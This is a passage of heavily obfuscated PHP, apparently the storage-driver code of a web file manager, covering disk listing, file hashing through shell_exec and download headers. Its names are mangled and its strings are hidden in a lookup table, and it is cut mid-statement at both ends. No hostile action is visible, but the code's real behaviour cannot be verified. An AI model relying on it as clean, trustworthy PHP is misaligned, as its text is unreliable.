$æ®«‘ö²[1291] . $Öáµ–›°[$æ®«‘ö²[399]] . $æ®«‘ö²[1280]; } public static function defaultDriverInit() { static $Ï¢ò¸áœ = false; if ($Ï¢ò¸áœ) { return $Ï¢ò¸áœ; } $Ï¢ò¸áœ = IO::init(self::defaultIO()); return $Ï¢ò¸áœ; } public static function fileTypeList() { $¶œ¢¬·¥ =& $_SERVER[ñˆ‹ß¿÷]; $ôôéŞ˜¢ = $GLOBALS[$¶œ¢¬·¥[6]][$¶œ¢¬·¥[1292]]; foreach ($ôôéŞ˜¢ as $è³ªîğß => $ÕçÀéÎâ) { $¡ëƒ¸ £ = $¶œ¢¬·¥[1293] . $è³ªîğß; $¯¾µõ¹· = LNG($¡ëƒ¸ £); if ($¡ëƒ¸ £ != $¯¾µõ¹·) { $ôôéŞ˜¢[$è³ªîğß][$¶œ¢¬·¥[32]] = $¯¾µõ¹·; } } return $ôôéŞ˜¢; } public static function diskList($ºÌÎ»ÉÏ = true) { $Üˆëíí = $_SERVER[ñˆ‹ß¿÷][1294]; if ($ºÌÎ»ÉÏ) { $ôÅüÆÈ = Cache::get($Üˆëíí); if (is_array($ôÅüÆÈ)) { return $ôÅüÆÈ; } } $ôÅüÆÈ = self::diskListGet(); Cache::set($Üˆëíí, $ôÅüÆÈ, 60); return $ôÅüÆÈ; } public static function diskListGet() { $Â¿£«˜ß =& $_SERVER[ñˆ‹ß¿÷]; $ÌÚïÖ®Š = array(); if ($GLOBALS[$Â¿£«˜ß[6]][$Â¿£«˜ß[1295]] == $Â¿£«˜ß[1296]) { $÷‰ˆËş· = $Â¿£«˜ß[1297]; for ($Ì·ìİøÚ = 0; $Ì·ìİøÚ < strlen($÷‰ˆËş·); $Ì·ìİøÚ++) { $çüÊŒˆ = $÷‰ˆËş·[$Ì·ìİøÚ] . $Â¿£«˜ß[1298]; if (file_exists($çüÊŒˆ)) { $ÌÚïÖ®Š[] = $çüÊŒˆ; } } return $ÌÚïÖ®Š; } if (!function_exists($Â¿£«˜ß[98])) { $ÌÚïÖ®Š[] = $Â¿£«˜ß[842]; return $ÌÚïÖ®Š; } $Ó©–µÅÑ = explode($Â¿£«˜ß[231], shell_exec($Â¿£«˜ß[1299])); array_shift($Ó©–µÅÑ); array_pop($Ó©–µÅÑ); $¨¿ÉÍŞì = array($Â¿£«˜ß[1300], $Â¿£«˜ß[1301], $Â¿£«˜ß[1302], $Â¿£«˜ß[1303], $Â¿£«˜ß[1304], $Â¿£«˜ß[1305], $Â¿£«˜ß[1306], $Â¿£«˜ß[1307]); foreach ($Ó©–µÅÑ as $ıöèÖê) { $ĞÁá³‘Å = preg_split($Â¿£«˜ß[1308], $ıöèÖê); $çüÊŒˆ = $ĞÁá³‘Å[count($ĞÁá³‘Å) - 1]; if (!strstr($ĞÁá³‘Å[0], $Â¿£«˜ß[1309]) || !$çüÊŒˆ) { continue; } $ş„ÄëíÏ = rtrim($çüÊŒˆ, $Â¿£«˜ß[8]) . $Â¿£«˜ß[8]; if (in_array($ş„ÄëíÏ, $¨¿ÉÍŞì)) { continue; } $ÌÚïÖ®Š[] = $ş„ÄëíÏ; } return $ÌÚïÖ®Š; } public static function isSameDisk($ÙØĞ­˜«, $âƒ¹·¿) { $¢ô›Şãº =& $_SERVER[ñˆ‹ß¿÷]; if ($GLOBALS[$¢ô›Şãº[6]][$¢ô›Şãº[1295]] == $¢ô›Şãº[1296]) { return strtolower(substr($ÙØĞ­˜«, 0, 1)) == strtolower(substr($âƒ¹·¿, 0, 1)); } $éˆŞú¬ğ = self::diskList(); $ÓÁÜÙëç = !1; $Ä¿µíÊ‘ = !1; sort($éˆŞú¬ğ); $éˆŞú¬ğ = array_reverse($éˆŞú¬ğ); $ÙØĞ­˜« = rtrim($ÙØĞ­˜«, $¢ô›Şãº[8]) . $¢ô›Şãº[8]; $âƒ¹·¿ = rtrim($âƒ¹·¿, $¢ô›Şãº[8]) . $¢ô›Şãº[8]; foreach ($éˆŞú¬ğ as $÷†Æ”‰) { $¥¾„»ŠÇ = strlen($÷†Æ”‰); if (!$ÓÁÜÙëç && substr($ÙØĞ­˜«, 0, $¥¾„»ŠÇ) == $÷†Æ”‰) { $ÓÁÜÙëç = $÷†Æ”‰; } if (!$Ä¿µíÊ‘ && substr($âƒ¹·¿, 0, $¥¾„»ŠÇ) == $÷†Æ”‰) { $Ä¿µíÊ‘ = $÷†Æ”‰; } if ($ÓÁÜÙëç && $Ä¿µíÊ‘) { break; } } return $ÓÁÜÙëç === $Ä¿µíÊ‘; } public static function transferType($§Öôâ·ã, $’ãÛ­Î) { $½£ë¬ù =& $_SERVER[ñˆ‹ß¿÷]; $§Äşİ = self::driverType($§Öôâ·ã); $§£ˆÃÂ = self::driverType($’ãÛ­Î); if ($§Äşİ[$½£ë¬ù[33]] == $§£ˆÃÂ[$½£ë¬ù[33]] && $§Äşİ[$½£ë¬ù[1310]] == $§£ˆÃÂ[$½£ë¬ù[1310]]) { return $½£ë¬ù[1311]; } if ($§Äşİ[$½£ë¬ù[33]] == $½£ë¬ù[871] && $§£ˆÃÂ[$½£ë¬ù[33]] == $½£ë¬ù[106]) { return $½£ë¬ù[1206]; } if ($§Äşİ[$½£ë¬ù[33]] == $½£ë¬ù[106] && $§£ˆÃÂ[$½£ë¬ù[33]] == $½£ë¬ù[871]) { return $½£ë¬ù[107]; } return $½£ë¬ù[1312]; } public static function driverType($Ìêø‘¯’) { $Ášåéî =& $_SERVER[ñˆ‹ß¿÷]; $ïŒ¯Šíş = str_replace($Ášåéî[1313], $Ášåéî[12], strtolower($Ìêø‘¯’->getType())); if ($ïŒ¯Šíş == $Ášåéî[765] || $ïŒ¯Šíş == $Ášåéî[1314] || $ïŒ¯Šíş == $Ášåéî[1315]) { $Ìêø‘¯’ = self::defaultDriverInit(); } else { if ($ïŒ¯Šíş == $Ášåéî[1213] || $ïŒ¯Šíş == $Ášåéî[1316]) { $Ìêø‘¯’ = IO::init($Ìêø‘¯’->pathParse[$Ášåéî[1158]]); } } $È§»‰áÃ = $Ìêø‘¯’->path; $ïŒ¯Šíş = str_replace($Ášåéî[1313], $Ášåéî[12], strtolower($Ìêø‘¯’->getType())); if ($ïŒ¯Šíş == $Ášåéî[106]) { return array($Ášåéî[33] => $Ášåéî[106], $Ášåéî[1310] => $Ášåéî[12], $Ášåéî[84] => $È§»‰áÃ); } return array($Ášåéî[33] => $Ášåéî[871], $Ášåéî[1310] => $Ìêø‘¯’->pathDriver, $Ášåéî[84] => $È§»‰áÃ); } public static function pathDriverType($†„Ô£ƒĞ) { return $†„Ô£ƒĞ ? self::driverType(IO::init($†„Ô£ƒĞ)) : !1; } } goto AÂ©˜ˆÕ»«; a»±Áî­Ã£: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $‰ñƒ÷šÃ =& $_SERVER[ñˆ‹ß¿÷]; $this->objectDriver = array($‰ñƒ÷šÃ[60], $‰ñƒ÷šÃ[61], $‰ñƒ÷šÃ[62], $‰ñƒ÷šÃ[63], $‰ñƒ÷šÃ[64], $‰ñƒ÷šÃ[65], $‰ñƒ÷šÃ[66], $‰ñƒ÷šÃ[67], $‰ñƒ÷šÃ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($âğ½ú³Í) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($âğ½ú³Í, $_SERVER[ñˆ‹ß¿÷][8]); } return $âğ½ú³Í; } public function iconvApp($®ÓšãÔ) { return $®ÓšãÔ; } public function iconvSystem($×Éå«Ñ) { return $×Éå«Ñ; } public function iconvTo($÷„¶èŒ¸, $Ú˜”˜Ù§, $¨ß ºˆ—) { $Å¡¹ÜÃ =& $_SERVER[ñˆ‹ß¿÷]; if (!$÷„¶èŒ¸ || !function_exists($Å¡¹ÜÃ[69])) { return $÷„¶èŒ¸; } static $’ê•©¯Ö = array(); $ô®Ÿ¥Û½ = $Ú˜”˜Ù§ . $Å¡¹ÜÃ[70] . $¨ß ºˆ— . $Å¡¹ÜÃ[71] . $÷„¶èŒ¸; if (isset($’ê•©¯Ö[$ô®Ÿ¥Û½])) { return $’ê•©¯Ö[$ô®Ÿ¥Û½]; } if (function_exists($Å¡¹ÜÃ[72])) { $á¹÷¹š‰ = @mb_convert_encoding($÷„¶èŒ¸, $¨ß ºˆ—, $Ú˜”˜Ù§); } else { $á¹÷¹š‰ = @iconv($Ú˜”˜Ù§, $¨ß ºˆ—, $÷„¶èŒ¸); } $á¹÷¹š‰ = $á¹÷¹š‰ ? $á¹÷¹š‰ : $÷„¶èŒ¸; if (strstr($á¹÷¹š‰, $Å¡¹ÜÃ[73])) { $á¹÷¹š‰ = str_replace($Å¡¹ÜÃ[73], $Å¡¹ÜÃ[11], $á¹÷¹š‰); } $’ê•©¯Ö[$Ú˜”˜Ù§ . $Å¡¹ÜÃ[70] . $¨ß ºˆ— . $Å¡¹ÜÃ[71] . $÷„¶èŒ¸] = $á¹÷¹š‰; $’ê•©¯Ö[$¨ß ºˆ— . $Å¡¹ÜÃ[70] . $Ú˜”˜Ù§ . $Å¡¹ÜÃ[71] . $÷„¶èŒ¸] = $÷„¶èŒ¸; $’ê•©¯Ö[$¨ß ºˆ— . $Å¡¹ÜÃ[70] . $Ú˜”˜Ù§ . $Å¡¹ÜÃ[71] . $á¹÷¹š‰] = $÷„¶èŒ¸; $’ê•©¯Ö[$Ú˜”˜Ù§ . $Å¡¹ÜÃ[70] . $¨ß ºˆ— . $Å¡¹ÜÃ[71] . $á¹÷¹š‰] = $á¹÷¹š‰; return $á¹÷¹š‰; } public function getPathInner($¶İ‡Ğï…) { $Û”¡˜‚ó = IO::init($¶İ‡Ğï…); return $Û”¡˜‚ó->path; } public function getPathOuter($ú‡…Ôı) { $„é£µó½ =& $_SERVER[ñˆ‹ß¿÷]; $´‘Ş‡ä = strlen(trim($this->pathBase, $„é£µó½[8])); $ú‡…Ôı = substr(trim($ú‡…Ôı, $„é£µó½[8]), $´‘Ş‡ä); return $this->pathDriver . $„é£µó½[8] . ltrim($ú‡…Ôı, $„é£µó½[8]); } public function isParentOf($–ú–‘ÃÉ, $Üœä‡À˜) { $âûß÷Í =& $_SERVER[ñˆ‹ß¿÷]; $–ú–‘ÃÉ = rtrim(strtolower($–ú–‘ÃÉ), $âûß÷Í[8]) . $âûß÷Í[8]; $Üœä‡À˜ = rtrim(strtolower($Üœä‡À˜), $âûß÷Í[8]) . $âûß÷Í[8]; $ìéÍàÚö = strpos($Üœä‡À˜, $–ú–‘ÃÉ) === 0; return $ìéÍàÚö; } public function getType() { $ıê¢‘íë =& $_SERVER[ñˆ‹ß¿÷]; $ÀŒŞ—Ú = str_replace($ıê¢‘íë[74], $ıê¢‘íë[12], get_class($this)); return strtolower($ÀŒŞ—Ú); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($õ„€ èÃ, $ªçìç‰) { $¶¨°£á =& $_SERVER[ñˆ‹ß¿÷]; $¼É‰–‰ = rtrim($õ„€ èÃ, $¶¨°£á[8]) . $¶¨°£á[8] . $ªçìç‰; $² °ÌŠî = $this->exist($¼É‰–‰); return $² °ÌŠî ? $¼É‰–‰ : !1; } public function setModifyTime($°¯Ğ–Ã, $öÁÆÀ¸¿ = '') { } public function renameObject($Ò¨õ™ë, $‚é­Ç§è) { $ÍÄø£¦³ = $‚é­Ç§è; $Ò¨õ™ë = $this->getPathOuter($Ò¨õ™ë); $‚é­Ç§è = $this->pathFather($Ò¨õ™ë) . $‚é­Ç§è; $‘ğô§âÉ = IO::copy($Ò¨õ™ë, $this->pathFather($Ò¨õ™ë), REPEAT_RENAME_FOLDER, $ÍÄø£¦³); if ($‘ğô§âÉ) { IO::remove($Ò¨õ™ë); } return $‘ğô§âÉ ? $‚é­Ç§è : !1; } public function tempFile($úıŸõ‹º = '', $Å³¿Ùı = '') { if (!$úıŸõ‹º) { $úıŸõ‹º = rand_string(15); } $è„ıŠÆ = TEMP_FILES . rand_string(15) . $_SERVER[ñˆ‹ß¿÷][8]; @mkdir($è„ıŠÆ, DEFAULT_PERRMISSIONS, !0); $‹¢¹¥Ë = $è„ıŠÆ . $úıŸõ‹º; @touch($‹¢¹¥Ë); if ($Å³¿Ùı) { file_put_contents($‹¢¹¥Ë, $Å³¿Ùı); } return $‹¢¹¥Ë; } public function tempFileRemve($ú‡Ùüöı) { @unlink($ú‡Ùüöı); @rmdir($this->pathFather($ú‡Ùüöı)); } public function mkfile($ù¢´ùºê, $Í÷ÌúçÄ = '', $¦ïœ¨„ = REPEAT_RENAME) { } public function mkdir($ŸìÇÉ°, $êŸ«ÄÄÒ = REPEAT_SKIP) { } public function delFile($­«æªÃ„) { } public function delFolder($‰Ë™ğ¢š) { } public function copyFile($¶ß–“¸Å, $Ø˜ÇŠµ«) { } public function moveFile($¹‹ùñÔ¥, $ºÊ½÷…˜) { } public function remove($¤Ç½«ò) { if ($this->isFile($¤Ç½«ò)) { return $this->delFile($¤Ç½«ò); } return $this->delFolder($¤Ç½«ò); } public function rename($÷İœà®, $ŒÔÖú°¼) { } public function exist($ññØ«¤ú) { } public function findByHash($½¶’Íäº = '', $ªçàÅó÷ = '') { return !1; } public function isFile($Ò‰¢øÏÉ) { } public function isFolder($•§¼ÚÛÈ) { } public function size($¢”ñ†é) { } public function info($Ü±¶Ä³ƒ) { } public function infoSimple($¥‰ùÒ²) { return $this->info($¥‰ùÒ²); } public function infoAuth($Ù§ú¥ºî) { return $this->info($Ù§ú¥ºî); } public function infoFull($Êñî²äù) { return $this->info($Êñî²äù); } public function infoWithChildren($Êò´¨ê«) { $§ìÅ¾„Ğ =& $_SERVER[ñˆ‹ß¿÷]; static $ŸÍşÙ®ª = array(); if (isset($ŸÍşÙ®ª[$Êò´¨ê«])) { return $ŸÍşÙ®ª[$Êò´¨ê«]; } $å¥–¯³í = $this->info($Êò´¨ê«); if ($å¥–¯³í && $å¥–¯³í[$§ìÅ¾„Ğ[33]] == $§ìÅ¾„Ğ[75]) { $ı„‹Æ– = array($§ìÅ¾„Ğ[76] => 0, $§ìÅ¾„Ğ[77] => 0, $§ìÅ¾„Ğ[78] => 0); $this->infoChildren($Êò´¨ê«, $ı„‹Æ–); $å¥–¯³í[$§ìÅ¾„Ğ[76]] = $ı„‹Æ–[$§ìÅ¾„Ğ[76]]; $å¥–¯³í[$§ìÅ¾„Ğ[79]] = array($§ìÅ¾„Ğ[80] => $ı„‹Æ–[$§ìÅ¾„Ğ[77]], $§ìÅ¾„Ğ[81] => $ı„‹Æ–[$§ìÅ¾„Ğ[78]]); $ŸÍşÙ®ª[$Êò´¨ê«] = $å¥–¯³í; } return $å¥–¯³í; } public function listPath($¬³á€¿, $ÂŠ¸¬Î = false) { } public function has($è¯ÆõÂ, $Òµö»Æ = false, $ŸÌüº¸Ô = false) { } public function canRead($Îå•¸Î) { } public function canWrite($º—êº¼ş) { } public function getContent($Â§Ÿóü) { } public function setContent($ëÇŠ¬Õé, $ØÈ­Õãí = '') { } protected function infoChildren($ÉÁ¤•ØÌ, &$È¶ÃÏ¬Ü) { $øÉã®Ë… =& $_SERVER[ñˆ‹ß¿÷]; check_abort_echo(); $¹æÙãïï = $this->listPath($ÉÁ¤•ØÌ, !0); $¹æÙãïï = array_merge($¹æÙãïï[$øÉã®Ë…[82]], $¹æÙãïï[$øÉã®Ë…[83]]); foreach ($¹æÙãïï as $Õ˜İßï) { if ($Õ˜İßï[$øÉã®Ë…[33]] == $øÉã®Ë…[75]) { $È¶ÃÏ¬Ü[$øÉã®Ë…[78]]++; $û²‘ô“ = $this->getPathInner($Õ˜İßï[$øÉã®Ë…[84]]); $this->infoChildren($û²‘ô“, $È¶ÃÏ¬Ü); } else { $È¶ÃÏ¬Ü[$øÉã®Ë…[77]]++; $È¶ÃÏ¬Ü[$øÉã®Ë…[76]] += $Õ˜İßï[$øÉã®Ë…[76]]; } } } public function fileSubstr($ÏÅ€ëØİ, $š¸’’´©, $¯òåèßé) { } public function listAll($ÏÙôç‡¥) { } public function listAllMake($Í¨¹ÙüÚ, &$ıÃá÷¡¶) { $åóÔË•– =& $_SERVER[ñˆ‹ß¿÷]; check_abort_echo(); $íÏûÒú­ = $this->listPath($Í¨¹ÙüÚ, !0); if (!$íÏûÒú­) { return; } $ã¹È´Ğé = array_merge($íÏûÒú­[$åóÔË•–[82]], $íÏûÒú­[$åóÔË•–[83]]); foreach ($ã¹È´Ğé as $¸ãË‘ì†) { $±â˜”ÅÃ = $¸ãË‘ì†[$åóÔË•–[33]] == $åóÔË•–[75]; $™ÎÙ¡ê¯ = array($åóÔË•–[84] => $¸ãË‘ì†[$åóÔË•–[84]], $åóÔË•–[75] => $±â˜”ÅÃ); if (isset($¸ãË‘ì†[$åóÔË•–[76]])) { $™ÎÙ¡ê¯[$åóÔË•–[76]] = $¸ãË‘ì†[$åóÔË•–[76]]; } if (isset($¸ãË‘ì†[$åóÔË•–[85]])) { $™ÎÙ¡ê¯[$åóÔË•–[85]] = $¸ãË‘ì†[$åóÔË•–[85]]; } if (!$±â˜”ÅÃ) { $ıÃá÷¡¶[] = $™ÎÙ¡ê¯; continue; } $ıÃá÷¡¶[] = $™ÎÙ¡ê¯; $™®Şã˜Å = $¸ãË‘ì†[$åóÔË•–[84]]; $Úß‹ëØñ = $this->pathDriver; if (substr($¸ãË‘ì†[$åóÔË•–[84]], 0, strlen($Úß‹ëØñ)) == $Úß‹ëØñ) { $™®Şã˜Å = substr($™®Şã˜Å, strlen($Úß‹ëØñ)); } $this->listAllMake($™®Şã˜Å, $ıÃá÷¡¶); } } public function listAllSimple($¹‡”Éà©) { $ó§ñ©î =& $_SERVER[ñˆ‹ß¿÷]; $çĞ“´¤ô = array(); $Œù¤–ıì = $this->listAll($¹‡”Éà©); $úÀ€ş… = $this->getPathOuter($¹‡”Éà©); foreach ($Œù¤–ıì as $’¯ÍÌô½) { $Ø¼æ÷åÜ = $’¯ÍÌô½[$ó§ñ©î[84]]; $ì˜õÕÕò = $’¯ÍÌô½[$ó§ñ©î[84]]; if (isset($’¯ÍÌô½[$ó§ñ©î[86]])) { $Ø¼æ÷åÜ = $’¯ÍÌô½[$ó§ñ©î[86]][$ó§ñ©î[84]]; $’¯ÍÌô½[$ó§ñ©î[76]] = $’¯ÍÌô½[$ó§ñ©î[86]][$ó§ñ©î[76]]; $’¯ÍÌô½[$ó§ñ©î[85]] = $’¯ÍÌô½[$ó§ñ©î[86]][$ó§ñ©î[85]]; } else { $ì˜õÕÕò = substr($’¯ÍÌô½[$ó§ñ©î[84]], strlen(get_path_father($úÀ€ş…))); $ì˜õÕÕò = $ó§ñ©î[8] . ltrim($ì˜õÕÕò, $ó§ñ©î[8]); } $ §³ş– = array($ó§ñ©î[84] => $ì˜õÕÕò, $ó§ñ©î[75] => $’¯ÍÌô½[$ó§ñ©î[75]]); if (isset($’¯ÍÌô½[$ó§ñ©î[76]]) && !$’¯ÍÌô½[$ó§ñ©î[75]]) { $ §³ş–[$ó§ñ©î[76]] = $’¯ÍÌô½[$ó§ñ©î[76]]; } if (isset($’¯ÍÌô½[$ó§ñ©î[85]])) { $ §³ş–[$ó§ñ©î[85]] = $’¯ÍÌô½[$ó§ñ©î[85]]; } if (!$’¯ÍÌô½[$ó§ñ©î[75]]) { $ §³ş–[$ó§ñ©î[87]] = $Ø¼æ÷åÜ; } $çĞ“´¤ô[] = $ §³ş–; } return $çĞ“´¤ô; } public function upload($Ôüõµï¿, $‰‹¹è¤Ö, $¢®›úçÚ = false, $á°—ŞÛ = REPEAT_REPLACE) { } public function uploadFileByID($‚Ù„’â³, $ëÙ²Ä†¦, $Õ«ç×ºæ) { } public function uploadFileByPath($ğ…¤›ö¾, $é“©ùäª, $“Û¿Üî¶ = array()) { } public function isUploadServer() { $ºÇ˜Ü¨¹ =& $_SERVER[ñˆ‹ß¿÷]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ºÇ˜Ü¨¹[88]) { return !0; } return $GLOBALS[$ºÇ˜Ü¨¹[6]][$ºÇ˜Ü¨¹[89]][$ºÇ˜Ü¨¹[90]]; } public function isFileOutServer() { $·¼˜çÎŠ =& $_SERVER[ñˆ‹ß¿÷]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $·¼˜çÎŠ[88]) { return !0; } return $GLOBALS[$·¼˜çÎŠ[6]][$·¼˜çÎŠ[89]][$·¼˜çÎŠ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($£×æĞÕ°) { $¸¾çºÖ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->isCdnHost()) { return $£×æĞÕ°; } return str_replace(trim(get_url_root($£×æĞÕ°), $¸¾çºÖ[8]), trim($this->cdnHost, $¸¾çºÖ[8]), $£×æĞÕ°); } public function uploadLink($œ£ó–Õª, $ëâ¡Î±  = 0) { $ØÙğ­¹Í =& $_SERVER[ñˆ‹ß¿÷]; if ($this->isUploadServer()) { return; } $ßô‰µÀ£ = $this->getType(); if (!in_array($ßô‰µÀ£, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¢•Å·ÙÕ = 1024 * 1024 * 10; $ö¨úõê¾ = $ëâ¡Î±  <= $¢•Å·ÙÕ ? $ØÙğ­¹Í[92] : $ØÙğ­¹Í[93]; $éúáÄû = (!$ëâ¡Î±  ? 1 : ceil($ëâ¡Î±  / pow(1024, 3))) * 3600 * 4; $áùòıáñ = $this->{$ö¨úõê¾}($œ£ó–Õª, $éúáÄû); if ($áùòıáñ) { $áùòıáñ[$ØÙğ­¹Í[94]] = $œ£ó–Õª; $áùòıáñ[$ØÙğ­¹Í[95]] = $ßô‰µÀ£; } return $áùòıáñ; } public function uploadFormData($Ñ·üÃéÛ, $¬àï¡ŞÛ = 3600) { } public function multiUploadFormData($Šş‹ÏÔ, $“œœŸˆÓ = 3600) { } public function download($À—Ù’ÈÜ, $ÌŠ…®’¾) { } public function ext($¿£Íáª ) { $©­›Ãğã =& $_SERVER[ñˆ‹ß¿÷]; if (strpos($¿£Íáª , $©­›Ãğã[8]) === -1) { $¼”ÅÖ˜« = $¿£Íáª ; } else { $¼”ÅÖ˜« = $this->pathThis($¿£Íáª ); } $²˜Ú¾‘­ = $©­›Ãğã[12]; if (strstr($¼”ÅÖ˜«, $©­›Ãğã[10])) { $²˜Ú¾‘­ = substr($¼”ÅÖ˜«, strrpos($¼”ÅÖ˜«, $©­›Ãğã[10]) + 1); $²˜Ú¾‘­ = strtolower($²˜Ú¾‘­); } if (strlen($²˜Ú¾‘­) > 3 && preg_match($©­›Ãğã[96], $²˜Ú¾‘­, $ÙÕÂÀÇû)) { $²˜Ú¾‘­ = $©­›Ãğã[12]; } return $²˜Ú¾‘­; } public function pathThis($¦½ÇÙÔï) { $ˆÄšßÏÚ =& $_SERVER[ñˆ‹ß¿÷]; $¦½ÇÙÔï = str_replace($ˆÄšßÏÚ[97], $ˆÄšßÏÚ[8], rtrim($¦½ÇÙÔï, $ˆÄšßÏÚ[8])); $ê²İ¬ë = strrpos($¦½ÇÙÔï, $ˆÄšßÏÚ[8]); if ($ê²İ¬ë === !1) { return $¦½ÇÙÔï; } return substr($¦½ÇÙÔï, $ê²İ¬ë + 1); } public function pathFather($èşº¬Ç¸) { $…£…ÚòÕ =& $_SERVER[ñˆ‹ß¿÷]; $èşº¬Ç¸ = str_replace($…£…ÚòÕ[97], $…£…ÚòÕ[8], rtrim($èşº¬Ç¸, $…£…ÚòÕ[8])); $Ì³ŞÑ×  = strrpos($èşº¬Ç¸, $…£…ÚòÕ[8]); if ($Ì³ŞÑ×  === !1) { return $…£…ÚòÕ[12]; } return substr($èşº¬Ç¸, 0, $Ì³ŞÑ×  + 1); } public function hashSimple($›îùÍ¼û) { $£º·•İÖ =& $_SERVER[ñˆ‹ß¿÷]; if (!$›îùÍ¼û) { return md5($£º·•İÖ[12]); } $ßñòó´Ä = $this->size($›îùÍ¼û); $ÖÕ–Ç–„ = 200; $Ãıô²Ç = 50; if ($ßñòó´Ä <= $ÖÕ–Ç–„ * $Ãıô²Ç) { return $this->hashMd5($›îùÍ¼û) . $ßñòó´Ä; } $ğß¥™¶ = intval($ßñòó´Ä / $Ãıô²Ç); $Ğ³°Â³ = $£º·•İÖ[12]; for ($ı¡¶»« = 0; $ı¡¶»« < $Ãıô²Ç; $ı¡¶»«++) { $Ğ³°Â³ .= $this->fileSubstr($›îùÍ¼û, $ğß¥™¶ * $ı¡¶»«, $ÖÕ–Ç–„); } $Ğ³°Â³ .= $this->fileSubstr($›îùÍ¼û, $ßñòó´Ä - $ÖÕ–Ç–„, $ÖÕ–Ç–„); return md5($Ğ³°Â³) . $ßñòó´Ä; } public static $md5Cache = array(); public function hashMd5($ıØŞ±Û€) { if (!$ıØŞ±Û€) { return md5($_SERVER[ñˆ‹ß¿÷][12]); } $ıØŞ±Û€ = $this->iconvSystem($ıØŞ±Û€); if (isset(self::$md5Cache[$ıØŞ±Û€])) { return self::$md5Cache[$ıØŞ±Û€]; } self::$md5Cache[$ıØŞ±Û€] = $this->hashMd5Shell($ıØŞ±Û€); if (!self::$md5Cache[$ıØŞ±Û€]) { self::$md5Cache[$ıØŞ±Û€] = @md5_file($ıØŞ±Û€); } return self::$md5Cache[$ıØŞ±Û€]; } private function hashMd5Shell($Ÿ«Ô‹Å›) { $Àµïˆ ¨ =& $_SERVER[ñˆ‹ß¿÷]; if (!$Ÿ«Ô‹Å›) { return md5($Àµïˆ ¨[12]); } if (!function_exists($Àµïˆ ¨[98])) { return !1; } $Ëáâ‡À = array($Àµïˆ ¨[99], $Àµïˆ ¨[100]); $áû’¼œå = Cache::get($Àµïˆ ¨[101]); if (!$áû’¼œå) { $¾ë‰îä¤ = BASIC_PATH . $Àµïˆ ¨[102]; $´·íñ¸» = md5_file($¾ë‰îä¤); $áû’¼œå = $Àµïˆ ¨[103]; foreach ($Ëáâ‡À as $‚İõ»î) { $Ú‹š´˜¾ = shell_exec($‚İõ»î . "\40\42{$¾ë‰îä¤}\x22"); if ($Ú‹š´˜¾ && substr(trim($Ú‹š´˜¾), 0, 32) == $´·íñ¸») { $áû’¼œå = $‚İõ»î; break; } } Cache::set($Àµïˆ ¨[101], $áû’¼œå, 3600); } if ($áû’¼œå == $Àµïˆ ¨[103]) { return !1; } $Ú‹š´˜¾ = shell_exec($áû’¼œå . "\40\42{$Ÿ«Ô‹Å›}\42"); $Ú‹š´˜¾ = str_replace($Àµïˆ ¨[104], $Àµïˆ ¨[12], $Ú‹š´˜¾); return substr($Ú‹š´˜¾, 0, 32); } public function link($¶ñáÌ«õ) { return $¶ñáÌ«õ; } public function fileOut($óş³·Ÿˆ, $»òº¿µ³ = false, $¶î¥ç¬ö = false, $¥ô×¡ = '') { $†ï‘Ÿøı =& $_SERVER[ñˆ‹ß¿÷]; $this->cacheMethod(null, null); if (!$óş³·Ÿˆ || !$this->exist($óş³·Ÿˆ)) { show_json(LNG($†ï‘Ÿøı[105]), !1, $¶î¥ç¬ö); } $Úí˜ÑĞ = $this->getType() == $†ï‘Ÿøı[106]; $Ã«¿œ“ğ = $GLOBALS[$†ï‘Ÿøı[6]][$†ï‘Ÿøı[89]][$†ï‘Ÿøı[107]][$†ï‘Ÿøı[108]]; $×É‡í¨ß = (double) $GLOBALS[$†ï‘Ÿøı[6]][$†ï‘Ÿøı[89]][$†ï‘Ÿøı[107]][$†ï‘Ÿøı[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¨×µâÕı = $this->infoFull($óş³·Ÿˆ); $¿õË¯¨› = $¨×µâÕı[$†ï‘Ÿøı[76]]; $Ñ‚¬ˆë = gmdate($†ï‘Ÿøı[110], $¨×µâÕı[$†ï‘Ÿøı[85]]); $ŞÅãçÊ‡ = $¶î¥ç¬ö ? $¶î¥ç¬ö : $this->iconvApp($¨×µâÕı[$†ï‘Ÿøı[32]]); $³–èù˜… = 0; $¶ˆñ¶ = $¿õË¯¨› - 1; $æâè³ãè = $this->ext($ŞÅãçÊ‡); if (in_array($æâè³ãè, array($†ï‘Ÿøı[111], $†ï‘Ÿøı[112], $†ï‘Ÿøı[113], $†ï‘Ÿøı[114]))) { $æâè³ãè = $†ï‘Ÿøı[115]; } if (in_array($æâè³ãè, array($†ï‘Ÿøı[116]))) { $æâè³ãè = $†ï‘Ÿøı[117]; } if (!$¥ô×¡) { $¥ô×¡ = md5($Ñ‚¬ˆë . $this->hashSimple($óş³·Ÿˆ)); } $¥ô×¡ = $†ï‘Ÿøı[118] . $¥ô×¡ . $†ï‘Ÿøı[118]; $æ¿•Ú·è = get_file_mime($æâè³ãè); $Û‹•Áà = !0; $Û‹•Áà = isset($_GET[$†ï‘Ÿøı[119]]) ? !1 : !0; if ($»òº¿µ³ === !1 && !mime_support($æ¿•Ú·è)) { $æ¿•Ú·è = $†ï‘Ÿøı[120]; } header($†ï‘Ÿøı[121]); header($†ï‘Ÿøı[122] . $æ¿•Ú·è); $¼ı«’Ö‚ = rawurlencode($ŞÅãçÊ‡); $¼ı«’Ö‚ = $†ï‘Ÿøı[118] . $¼ı«’Ö‚ . $†ï‘Ÿøı[123] . $¼ı«’Ö‚; if ($»òº¿µ³) { header($†ï‘Ÿøı[124]); header($†ï‘Ÿøı[125] . $¼ı«’Ö‚); } else { if ($Û‹•Áà) { header($†ï‘Ÿøı[126] . $¼ı«’Ö‚); } } header($†ï‘Ÿøı[127] . gmdate($†ï‘Ÿøı[110], time() + 3600 * 24 * 30) . $†ï‘Ÿøı[128]); header($†ï‘Ÿøı[129]); header($†ï‘Ÿøı[130]); header($†ï‘Ÿøı[131]); if 